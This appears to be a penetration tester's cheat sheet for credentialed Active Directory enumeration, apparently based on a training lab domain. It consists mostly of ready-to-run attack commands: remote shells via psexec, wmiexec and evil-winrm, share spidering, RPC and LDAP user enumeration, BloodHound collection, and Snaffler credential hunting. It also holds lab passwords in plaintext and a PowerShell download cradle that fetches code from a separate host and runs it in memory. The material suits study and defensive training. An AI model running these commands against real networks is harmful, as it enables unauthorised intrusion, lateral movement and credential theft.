#ad #enumeration #smb #ldap #rpcclient #bloodhound

# Credentialed AD Enumeration (Linux tooling)

Enumerating a domain from a Linux host with valid creds. Related: [enumeration](enumeration.md) · [netexec](NetExec.md) · [password-spraying](password-spraying.md) · [common-services](../Network/common-services.md)

## Contents
- [Access](#access)
- [Shares](#shares)
- [Users / Groups / RPC](#users--groups--rpc)
- [BloodHound (credentialed)](#bloodhound-credentialed)
- [Living off the Land (Windows, no tools)](#living-off-the-land-windows-no-tools)
- [File Transfer Helpers](#file-transfer-helpers)

## Access

| Tool | Command | Gives you |
|---|---|---|
| xfreerdp | `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Full RDP desktop session |
| psexec.py | `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` | SYSTEM shell via ADMIN$ share (Impacket) |
| wmiexec.py | `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` | Semi-interactive shell via WMI (Impacket) |
| evil-winrm | `evil-winrm -i 10.129.201.234 -u forend` | PowerShell session over WinRM |

```bash
xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25
```
RDP to a Windows target with valid creds.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
Shell via ADMIN$ share (Impacket).

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
Semi-interactive shell via WMI (Impacket).

```bash
evil-winrm -i 10.129.201.234 -u forend
```
PowerShell session over WinRM. See [lateral-movement](../Windows/lateral-movement.md).

## Shares
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
List shares and permissions.

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
```
Recursively list directories in SYSVOL.

```bash
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
```
Spider a readable share and dump file listing as JSON.

## Users / Groups / RPC
```bash
rpcclient -U "" -N 172.16.5.5
```
Connect via SMB NULL session.

```text
rpcclient $> enumdomusers
```
Enumerate domain users and RIDs.

```text
rpcclient $> queryuser 0x457
```
Query a user by RID.

```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
Extract usernames with enum4linux.

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
Enumerate password policy; output YAML/JSON.

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
Enumerate users via LDAP.

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da
```
Enumerate the Domain Admins group (windapsearch).

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU
```
Recursively find users with nested privileges.

## BloodHound (credentialed)
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
Collect BloodHound data with creds. See [enumeration](enumeration.md).

```bash
zip -r ilfreight_bh.zip *.json
```
Zip the JSON for import into the BloodHound GUI.

## Living off the Land (Windows, no tools)
```powershell
Get-ADDomain
```
Gather domain info (AD module).

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
Find accounts with SPNs. See [kerberoasting](kerberoasting.md).

```powershell
Get-ADGroupMember -Identity "Backup Operators"
```
List members of a group.

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```
Hunt shares for credentials/sensitive data (Snaffler).

## File Transfer Helpers
```bash
impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/
```
Host a quick SMB share for file transfer. See [file-transfers](../Tools/file-transfers.md).

```powershell
IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')
```
Download and run a file in memory (PowerShell).
